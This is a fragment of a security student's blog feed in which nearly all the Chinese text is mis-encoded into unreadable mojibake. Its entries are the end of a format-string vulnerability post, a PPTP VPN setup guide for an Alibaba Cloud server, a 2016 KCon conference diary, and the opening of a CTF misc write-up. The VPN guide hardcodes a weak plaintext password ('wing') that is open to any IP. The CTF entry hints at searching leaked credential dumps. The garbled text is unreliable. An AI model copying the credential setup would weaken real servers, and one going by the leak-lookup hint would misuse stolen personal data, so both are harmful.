class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·é—®é¢˜å°±æ¥äº†ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºç¨‹åºå‘˜å¯¹ç”¨æˆ·(é»‘å®¢)çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œè‰¯å¥½çš„è¿‡æ»¤ï¼Œé™åˆ¶ï¼Œé€ æˆäº†è¿™ä¸ªæ¼æ´çš„å‡ºç°ã€‚å› æ­¤åƒä¸‡ä¸è¦å°†<strong>printf</strong>ä¸­çš„formatå­—ç¬¦ä¸²çš„æ“ä½œæƒäº¤ç»™ç”¨æˆ·(é»‘å®¢)ã€‚</p><h2 id="ç›´æ¥æ‹¿ä¸€ä¸ªé¢˜æ¥åšæ¼”ç¤º"><a href="#ç›´æ¥æ‹¿ä¸€ä¸ªé¢˜æ¥åšæ¼”ç¤º" class="headerlink" title="ç›´æ¥æ‹¿ä¸€ä¸ªé¢˜æ¥åšæ¼”ç¤º"></a>ç›´æ¥æ‹¿ä¸€ä¸ªé¢˜æ¥åšæ¼”ç¤º</h2><p>é¢˜ç›®åœ°å€ï¼š<a href="https://pan.baidu.com/s/1nuLAAgh">https://pan.baidu.com/s/1nuLAAgh</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨é˜¿é‡Œäº‘æ­å»ºVPN</title>
      <link href="%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAVPN.html"/>
      <url>%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAVPN.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ç§‘å­¦ä¸Šç½‘â€”-åˆ©ç”¨é˜¿é‡Œäº‘ECSæ¶è®¾VPN</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><ol><li>é˜¿é‡Œäº‘ä¸ŠECSä¸Šæ¶è®¾VPN</li><li>æœ¬åœ°è¿æ¥ä½¿ç”¨VPNæ‹¨å·åˆ°é˜¿é‡Œäº‘ECS</li><li>ä½¿ç”¨é˜¿é‡Œäº‘å®ç°ç¿»å¢™ç­‰åŠŸèƒ½</li></ol><h1 id="é¦–å…ˆè¦å°å›½å¤–IPçš„æœåŠ¡å™¨"><a href="#é¦–å…ˆè¦å°å›½å¤–IPçš„æœåŠ¡å™¨" class="headerlink" title="é¦–å…ˆè¦å°å›½å¤–IPçš„æœåŠ¡å™¨"></a>é¦–å…ˆè¦å°å›½å¤–IPçš„æœåŠ¡å™¨</h1><h1 id="æ¶è®¾VPN"><a href="#æ¶è®¾VPN" class="headerlink" title="æ¶è®¾VPN"></a>æ¶è®¾VPN</h1><h2 id="å®‰è£…ppp-pptpd-iptables"><a href="#å®‰è£…ppp-pptpd-iptables" class="headerlink" title="å®‰è£…ppp pptpd iptables"></a>å®‰è£…ppp pptpd iptables</h2><p>ppp æ•°æ®é“¾å±‚åè®®<br>pptpd VPNæœåŠ¡ç±»å‹<br>iptables é˜²ç«å¢™ï¼Œç”¨æ¥æ¶ˆæ¯è½¬å‘<br><code>yum install ppp pptpd iptables</code><br>å®‰è£…åçš„ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ lsb_release -a  </span><br><span class="line">LSB Version:    :base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch  </span><br><span class="line">Distributor ID: CentOS  </span><br><span class="line">Description:    CentOS release 6.6 (Final)  </span><br><span class="line">Release:    6.6  </span><br><span class="line">Codename:   Final  </span><br><span class="line">$ pptpd --version  </span><br><span class="line">pptpd v1.4.0  </span><br><span class="line">$ iptables --version  </span><br><span class="line">iptables v1.4.7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é…ç½®ppp-DNS-ä¿¡æ¯"><a href="#é…ç½®ppp-DNS-ä¿¡æ¯" class="headerlink" title="é…ç½®ppp DNS ä¿¡æ¯"></a>é…ç½®ppp DNS ä¿¡æ¯</h2><h3 id="ç¼–è¾‘-options-pptpd-é…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘-options-pptpd-é…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘ options.pptpd é…ç½®æ–‡ä»¶"></a>ç¼–è¾‘ options.pptpd é…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ppp&#x2F;options.pptpd</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºä¸€ä¸‹å†…å®¹ å»æ‰å‰é¢çš„# </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms-dns 8.8.8.8</span><br><span class="line">ms-dns 8.8.4.4</span><br></pre></td></tr></table></figure><h2 id="é…ç½®ppp-VPNå¸å·ä¿¡æ¯"><a href="#é…ç½®ppp-VPNå¸å·ä¿¡æ¯" class="headerlink" title="é…ç½®ppp VPNå¸å·ä¿¡æ¯"></a>é…ç½®ppp VPNå¸å·ä¿¡æ¯</h2><h3 id="ç¼–è¾‘chap-secretsé…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘chap-secretsé…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘chap-secretsé…ç½®æ–‡ä»¶"></a>ç¼–è¾‘chap-secretsé…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ppp&#x2F;chap-secrets</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®è§„åˆ™ä¸ºVPNå¸å·-æœåŠ¡ç±»å‹-VPNå¯†ç -IP-è‹¥IPä¸º-åˆ™ä»£è¡¨æ‰€æœ‰IPéƒ½å¯ä»¥ä½¿ç”¨è¯¥å¸å·å¯†ç "><a href="#è®¾ç½®è§„åˆ™ä¸ºVPNå¸å·-æœåŠ¡ç±»å‹-VPNå¯†ç -IP-è‹¥IPä¸º-åˆ™ä»£è¡¨æ‰€æœ‰IPéƒ½å¯ä»¥ä½¿ç”¨è¯¥å¸å·å¯†ç " class="headerlink" title="è®¾ç½®è§„åˆ™ä¸ºVPNå¸å· æœåŠ¡ç±»å‹ VPNå¯†ç  IP,è‹¥IPä¸º*åˆ™ä»£è¡¨æ‰€æœ‰IPéƒ½å¯ä»¥ä½¿ç”¨è¯¥å¸å·å¯†ç "></a>è®¾ç½®è§„åˆ™ä¸ºVPNå¸å· æœåŠ¡ç±»å‹ VPNå¯†ç  IP,è‹¥IPä¸º*åˆ™ä»£è¡¨æ‰€æœ‰IPéƒ½å¯ä»¥ä½¿ç”¨è¯¥å¸å·å¯†ç </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Secrets for authentication using CHAP  </span><br><span class="line"># client    server  secret          IP addresses  </span><br><span class="line">SeeSea   pptpd   wing       *</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¸å·æ˜¯SeeSea å¯†ç æ˜¯wing   </p><h2 id="é…ç½®pptpd"><a href="#é…ç½®pptpd" class="headerlink" title="é…ç½®pptpd"></a>é…ç½®pptpd</h2><h3 id="ç¼–è¾‘options-pptpd-é…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘options-pptpd-é…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘options.pptpd é…ç½®æ–‡ä»¶"></a>ç¼–è¾‘options.pptpd é…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pptpd.conf</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹æˆä¸€ä¸‹å†…å®¹ï¼Œå°†æ³¨é‡Šå»æ‰å³å¯"><a href="#ä¿®æ”¹æˆä¸€ä¸‹å†…å®¹ï¼Œå°†æ³¨é‡Šå»æ‰å³å¯" class="headerlink" title="ä¿®æ”¹æˆä¸€ä¸‹å†…å®¹ï¼Œå°†æ³¨é‡Šå»æ‰å³å¯"></a>ä¿®æ”¹æˆä¸€ä¸‹å†…å®¹ï¼Œå°†æ³¨é‡Šå»æ‰å³å¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localip 192.168.0.1</span><br><span class="line">remoteip 192.168.0.234-238,192.168.0.245</span><br></pre></td></tr></table></figure><h2 id="é…ç½®å†…æ ¸æ”¯æŒè½¬å‘"><a href="#é…ç½®å†…æ ¸æ”¯æŒè½¬å‘" class="headerlink" title="é…ç½®å†…æ ¸æ”¯æŒè½¬å‘"></a>é…ç½®å†…æ ¸æ”¯æŒè½¬å‘</h2><h3 id="ç¼–è¾‘sysctl-conf-é…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘sysctl-conf-é…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘sysctl.conf é…ç½®æ–‡ä»¶"></a>ç¼–è¾‘sysctl.conf é…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;sysctl.conf</span><br></pre></td></tr></table></figure><h3 id="æ‰¾åˆ°ç¬¬7è¡Œè¿›è¡Œä¿®æ”¹-ä¿®æ”¹ç»“æœä¸º"><a href="#æ‰¾åˆ°ç¬¬7è¡Œè¿›è¡Œä¿®æ”¹-ä¿®æ”¹ç»“æœä¸º" class="headerlink" title="æ‰¾åˆ°ç¬¬7è¡Œè¿›è¡Œä¿®æ”¹  ä¿®æ”¹ç»“æœä¸º"></a>æ‰¾åˆ°ç¬¬7è¡Œè¿›è¡Œä¿®æ”¹  ä¿®æ”¹ç»“æœä¸º</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward &#x3D; 1</span><br></pre></td></tr></table></figure><h3 id="é‡æ–°åŠ è½½å†…æ ¸é…ç½®é¡¹"><a href="#é‡æ–°åŠ è½½å†…æ ¸é…ç½®é¡¹" class="headerlink" title="é‡æ–°åŠ è½½å†…æ ¸é…ç½®é¡¹"></a>é‡æ–°åŠ è½½å†…æ ¸é…ç½®é¡¹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><h2 id="é…ç½®iptables"><a href="#é…ç½®iptables" class="headerlink" title="é…ç½®iptables"></a>é…ç½®iptables</h2><h3 id="é¦–æ¬¡è¿è¡Œ-iptables-æŸ¥çœ‹iptablesè¿è¡ŒçŠ¶æ€"><a href="#é¦–æ¬¡è¿è¡Œ-iptables-æŸ¥çœ‹iptablesè¿è¡ŒçŠ¶æ€" class="headerlink" title="é¦–æ¬¡è¿è¡Œ iptables æŸ¥çœ‹iptablesè¿è¡ŒçŠ¶æ€"></a>é¦–æ¬¡è¿è¡Œ iptables æŸ¥çœ‹iptablesè¿è¡ŒçŠ¶æ€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service iptables status</span><br><span class="line">iptables: Firewall is not running</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨iptablesæœåŠ¡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure><h2 id="é…ç½®è§„åˆ™"><a href="#é…ç½®è§„åˆ™" class="headerlink" title="é…ç½®è§„åˆ™"></a>é…ç½®è§„åˆ™</h2><h3 id="ç¬¬ä¸€æ¬¡é…ç½®"><a href="#ç¬¬ä¸€æ¬¡é…ç½®" class="headerlink" title="ç¬¬ä¸€æ¬¡é…ç½®"></a>ç¬¬ä¸€æ¬¡é…ç½®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i lo -j ACCEPT #å…è®¸127.0.0.1è®¿é—®æœ¬åœ°æœåŠ¡  </span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT #å…è®¸è®¿é—®å¤–éƒ¨æœåŠ¡  </span><br><span class="line">iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT #å…è®¸ ping  </span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #å¼€å¯ ssh ç«¯å£</span><br></pre></td></tr></table></figure><h3 id="å·²ç»é…ç½®-iptables"><a href="#å·²ç»é…ç½®-iptables" class="headerlink" title="å·²ç»é…ç½® iptables"></a>å·²ç»é…ç½® iptables</h3><p>è®¾ç½®è½¬å‘ç­–ç•¥ï¼ˆbecause é˜¿é‡Œäº‘æ˜¯åŒç½‘å¡ï¼Œå†…ç½‘eth0,å¤–ç½‘eth1ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0&#x2F;24 -o eth1 -jMASQUERADE </span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®VPNç«¯å£ç­–ç•¥"><a href="#è®¾ç½®VPNç«¯å£ç­–ç•¥" class="headerlink" title="è®¾ç½®VPNç«¯å£ç­–ç•¥"></a>è®¾ç½®VPNç«¯å£ç­–ç•¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 1723 -j ACCEPT</span><br></pre></td></tr></table></figure><h3 id="ä¿å­˜iptables-é€‰é¡¹å¹¶é‡æ–°å¯åŠ¨iptables"><a href="#ä¿å­˜iptables-é€‰é¡¹å¹¶é‡æ–°å¯åŠ¨iptables" class="headerlink" title="ä¿å­˜iptables é€‰é¡¹å¹¶é‡æ–°å¯åŠ¨iptables"></a>ä¿å­˜iptables é€‰é¡¹å¹¶é‡æ–°å¯åŠ¨iptables</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure><p>##Finally</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart #é‡æ–°å¯åŠ¨ iptables  </span><br><span class="line">sudo service pptpd restart #é‡æ–°å¯åŠ¨ pptpd  </span><br><span class="line">sudo chkconfig iptables on #å¼€æœºå¯åŠ¨ iptables  </span><br><span class="line">sudo chkconfig pptpd on #å¼€æœºå¯åŠ¨ pptpd  </span><br><span class="line">sudo iptables -P INPUT DROP #åŠ è½½é˜²ç«å¢™ç­–ç•¥  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å„ç§å‚è€ƒèµ„æ–™"><a href="#å„ç§å‚è€ƒèµ„æ–™" class="headerlink" title="å„ç§å‚è€ƒèµ„æ–™"></a>å„ç§å‚è€ƒèµ„æ–™</h1><p><a href="http://blog.sina.com.cn/s/blog_3eba8f1c0102uxyc.html" title="é˜¿é‡Œäº‘" class="gallery-item"><img src="http://blog.sina.com.cn/s/blog_3eba8f1c0102uxyc.html" alt="é˜¿é‡Œäº‘"></a><br><a href="http://blog.abv.cn/?p=50" title="é˜¿é‡Œäº‘Centosé…ç½®iptablesé˜²ç«å¢™" class="gallery-item"><img src="http://blog.abv.cn/?p=50" alt="é˜¿é‡Œäº‘Centosé…ç½®iptablesé˜²ç«å¢™"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç§‘å­¦ä¸Šç½‘ </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016é»‘å®¢è¥¿éƒ¨å¤§ä¼š</title>
      <link href="2016-Hackers-Western-Conference.html"/>
      <url>2016-Hackers-Western-Conference.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ä¼šè®®å‰ä¸€æ™š"><a href="#ä¼šè®®å‰ä¸€æ™š" class="headerlink" title="ä¼šè®®å‰ä¸€æ™š"></a>ä¼šè®®å‰ä¸€æ™š</h1><h2 id="Day-6æœˆ3æ—¥"><a href="#Day-6æœˆ3æ—¥" class="headerlink" title="Day:6æœˆ3æ—¥"></a>Day:6æœˆ3æ—¥</h2><p>ä¸ºäº†å‚åŠ Kconâ€™éº¦é¦™å¸ˆå‚…å’Œæˆ‘æå‰ä¸€å¤©å»äº†åŸé‡Œã€‚å»åŸé‡Œé˜¿â€¦å¥½ä¹…æ²¡è¿›åŸå•¦~  </p><h3 id="ç¬¬ä¸€å¹•"><a href="#ç¬¬ä¸€å¹•" class="headerlink" title="ç¬¬ä¸€å¹•"></a>ç¬¬ä¸€å¹•</h3><p>æ‰¾äº†å®¶å®¾é¦†ï¼Œç„¶åéº¦é¦™å¸ˆå‚…å¸¦æˆ‘å»åƒå¥½åƒçš„å•¦<del>~</del><br><a href="http://o89648qv2.bkt.clouddn.com/2.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/2.jpg"></a><br>æˆ‘åªèƒ½è¯´ éº¦é¦™å¸ˆå‚…ä½ çœŸæ˜¯å°é¾™è™¾è¾¾äººã€‚å¯¹äº†ä½ ä¸æ˜¯çŸ¥é“æˆ‘ä¸èƒ½åƒè¾£å˜›â€¦æŠŠæˆ‘è¾£å“­äº†..</p><h3 id="ç¬¬äºŒå¹•"><a href="#ç¬¬äºŒå¹•" class="headerlink" title="ç¬¬äºŒå¹•"></a>ç¬¬äºŒå¹•</h3><p>æˆ‘ä»¬è½¬äº†ç¬¬äºŒåœºï¼Œç½‘å’–â€¦<br>æˆ‘ä¹Ÿæ˜¯æœäº† éº¦é¦™å¸ˆå‚…åœ¨ç½‘å§çœ‹ä¹Œäº‘â€¦æœç„¶çœŸå¤§è¡¨å“¥â€¦<br><a href="http://o89648qv2.bkt.clouddn.com/3.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/3.jpg"></a> å¿½è§†å³ä¸‹è§’â€¦</p><h3 id="ç¬¬ä¸‰å¹•"><a href="#ç¬¬ä¸‰å¹•" class="headerlink" title="ç¬¬ä¸‰å¹•"></a>ç¬¬ä¸‰å¹•</h3><p>æˆ‘ä»¬å»äº†èŠ™è“‰è¡—çœ‹ä»–ä»¬æ’¸ä¸²â€¦ä»¥åŠå–é…’..æˆ‘è¿˜æ˜¯ä¸ªå­©å­é˜¿ ï¼ˆå…¶å®æˆ‘å¾ˆèƒ½å–ï¼Œè‡³å°‘ä¸æ˜¯éº¦é¦™å¸ˆå‚…ä¸¤æ¯å€’ï¼‰</p><h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><p>ä»Šå¤©æ™šä¸Šè®¤è¯†äº†å¥½å‡ ä¸ªäººï¼Œå››å¶è‰ä¸€å¤§æ³¢ï¼Œ.è´¤å”è¡¨å“¥â€“é˜¿é‡Œåº”æ€¥ä¸­å¿ƒçš„ï¼ŒLinEâ€“æ„Ÿè§‰å°±æ˜¯ç¡¬ä»¶&amp;&amp;äºŒè¿›åˆ¶çš„å¤§è¡¨å“¥ï¼ˆéº¦é¦™å¸ˆå‚…ä»–æ˜¯ä¸æ˜¯å’Œä½ æœ‰è‚®è„çš„PYäº¤æ˜“ï¼‰ä»¥åŠå¥½å¤šå¥½å¤šâ€¦<br>ï¼ˆps:è®¤è¯†äº†ä¸€ä¸ªå¦é—¨çš„å¤§å“¥ Jonnyï¼‰</p><h1 id="ä¼šè®®å½“å¤©"><a href="#ä¼šè®®å½“å¤©" class="headerlink" title="ä¼šè®®å½“å¤©"></a>ä¼šè®®å½“å¤©</h1><h2 id="Day-6æœˆ4æ—¥"><a href="#Day-6æœˆ4æ—¥" class="headerlink" title="Day:6æœˆ4æ—¥"></a>Day:6æœˆ4æ—¥</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>å“å‘€å¦ˆå‘€è¿Ÿåˆ°å•¦â€¦é”™è¿‡äº†æ‘‡æ»š<br><a href="http://o89648qv2.bkt.clouddn.com/4.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/4.jpg"></a></p><h3 id="è®®é¢˜-amp-amp-å­¦ä¹ åˆ°çš„ä¸œè¥¿"><a href="#è®®é¢˜-amp-amp-å­¦ä¹ åˆ°çš„ä¸œè¥¿" class="headerlink" title="è®®é¢˜&amp;&amp;å­¦ä¹ åˆ°çš„ä¸œè¥¿"></a>è®®é¢˜&amp;&amp;å­¦ä¹ åˆ°çš„ä¸œè¥¿</h3><p>ä¸€ä¸‹çœç•¥å‡ åƒä¸ªå­—ï¼Œç­‰æˆ‘ç¡é†’äº†å†æ¥æ•´ç†..<br><a href="http://o89648qv2.bkt.clouddn.com/%E8%AE%AE%E9%A2%98.jpg" class="gallery-item"><img src="http://o89648qv2.bkt.clouddn.com/%E8%AE%AE%E9%A2%98.jpg"></a><br>æˆ‘æ‹¿äº†å‡ ä¸ªæˆ‘æ¯”è¾ƒæœ‰æ„Ÿè§¦çš„è®®é¢˜</p><h4 id="ç½‘ç»œç©ºé—´å¯¹æŠ—â€“åŸºç¡€å†³å®šæˆè´¥"><a href="#ç½‘ç»œç©ºé—´å¯¹æŠ—â€“åŸºç¡€å†³å®šæˆè´¥" class="headerlink" title="ç½‘ç»œç©ºé—´å¯¹æŠ—â€“åŸºç¡€å†³å®šæˆè´¥"></a>ç½‘ç»œç©ºé—´å¯¹æŠ—â€“åŸºç¡€å†³å®šæˆè´¥</h4><h4 id="ä¸€èµ·è·¨å›½ç½‘ç»œè¯ˆéª—æ¡ˆçš„å§‹æœ«"><a href="#ä¸€èµ·è·¨å›½ç½‘ç»œè¯ˆéª—æ¡ˆçš„å§‹æœ«" class="headerlink" title="ä¸€èµ·è·¨å›½ç½‘ç»œè¯ˆéª—æ¡ˆçš„å§‹æœ«"></a>ä¸€èµ·è·¨å›½ç½‘ç»œè¯ˆéª—æ¡ˆçš„å§‹æœ«</h4><h4 id="å¤šæ´»çš„5å¹´"><a href="#å¤šæ´»çš„5å¹´" class="headerlink" title="å¤šæ´»çš„5å¹´"></a>å¤šæ´»çš„5å¹´</h4><h4 id="åŸºäºå¤§æ•°æ®çš„åƒµå°¸ç½‘ç»œæ”»å‡»ç›‘æ§"><a href="#åŸºäºå¤§æ•°æ®çš„åƒµå°¸ç½‘ç»œæ”»å‡»ç›‘æ§" class="headerlink" title="åŸºäºå¤§æ•°æ®çš„åƒµå°¸ç½‘ç»œæ”»å‡»ç›‘æ§"></a>åŸºäºå¤§æ•°æ®çš„åƒµå°¸ç½‘ç»œæ”»å‡»ç›‘æ§</h4><h4 id="æµ…è°ˆå®‰å…¨ä¸»æˆ˜åœºè½¬ç§»"><a href="#æµ…è°ˆå®‰å…¨ä¸»æˆ˜åœºè½¬ç§»" class="headerlink" title="æµ…è°ˆå®‰å…¨ä¸»æˆ˜åœºè½¬ç§»"></a>æµ…è°ˆå®‰å…¨ä¸»æˆ˜åœºè½¬ç§»</h4><h3 id="æœ€åé™„ä¸Šå‡ å¼ å›¾ç‰‡ä»¥åŠæˆ‘çš„æ„Ÿè§¦ã€‚"><a href="#æœ€åé™„ä¸Šå‡ å¼ å›¾ç‰‡ä»¥åŠæˆ‘çš„æ„Ÿè§¦ã€‚" class="headerlink" title="æœ€åé™„ä¸Šå‡ å¼ å›¾ç‰‡ä»¥åŠæˆ‘çš„æ„Ÿè§¦ã€‚"></a>æœ€åé™„ä¸Šå‡ å¼ å›¾ç‰‡ä»¥åŠæˆ‘çš„æ„Ÿè§¦ã€‚</h3><p>ä¿¡å®‰åœˆå­çœŸçš„å¾ˆå°ï¼Œåšä¿¡å®‰çœŸä¸æ˜¯ä¸€ä¸‹å­å°±èƒ½æˆä¸ºå¤§ç‰›çš„ã€‚<br>ä»¥åŠæˆ‘å­¦åˆ°äº†ä»–ä»¬çš„æ€è€ƒæ¨¡å¼ï¼Œåˆ°äº†ä»–ä»¬è¿™ç§é˜¶æ®µä¸ä»…è¦è·å–åœ¨è·å–æ–°çš„çŸ¥è¯†ï¼Œä¹Ÿæœ‰äº†è‡ªå·±å„è‡ªç ”ç©¶çš„æ–¹å‘ã€‚</p><p>æ€»è€Œè¨€ä¹‹ç»§ç»­åŠ æ²¹å§ï¼ï¼ï¼</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kcon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›</title>
      <link href="2016-Networ-space-security-technology-competition-of-shaanxi.html"/>
      <url>2016-Networ-space-security-technology-competition-of-shaanxi.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="æ¯”èµ›å‰å¤œâ€¦"><a href="#æ¯”èµ›å‰å¤œâ€¦" class="headerlink" title="æ¯”èµ›å‰å¤œâ€¦"></a>æ¯”èµ›å‰å¤œâ€¦</h1><p>å¤§å®¶ç©å¾—æŒºå—¨çš„ï¼Œè¿˜æ²¡æ¯”èµ›é…’åº—éƒ½æ‰“èµ·æ¥äº†ï¼Œé‡‘æ€»ä¸€ä¸‹åˆå°±æ‹¿äº†ä¸ªè·¯ç”±å™¨å¼€äº†APéš”ç¦»ï¼Œé‡‘æ€»å°±æ˜¯6666   </p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a><strong>MIsc</strong></h2><h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc_2"></a>Misc_2</h3><p> pngå›¾ é¦–å…ˆå¥—è·¯ï¼Œwinhexçœ‹ä¸€ä¸‹å¤´ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-01.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-01.bmp"></a></p><p>æ˜æ˜¾å°‘äº†ä¸ªå¤´ã€‚ç»™ä»–åŠ ä¸Šã€<br>æ‰“å¼€å›¾ç‰‡</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-2.bmp" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-2.bmp"></a></p><p>éƒ½æ˜¯å¥—è·¯é˜¿â€¦â€¦</p><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc_5"></a>Misc_5</h3><p>ä¸€ä¸ªä¼ªåŠ å¯†ã€‚æˆ‘è¿˜æ˜¯ç”¨æ‰‹æœºçš„æ–¹æ³•æ‰“å¼€äº†ã€‚å¯†ç æ˜¯flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-3.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-shanxi-3.jpg"></a></p><p>æ‰“å¼€æ˜¯ä¸ªç¤¾å·¥é¢˜ã€‚æŸ¥ä¸‹è£¤å­å§ã€‚</p><h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc_6"></a>Misc_6</h3><p>png 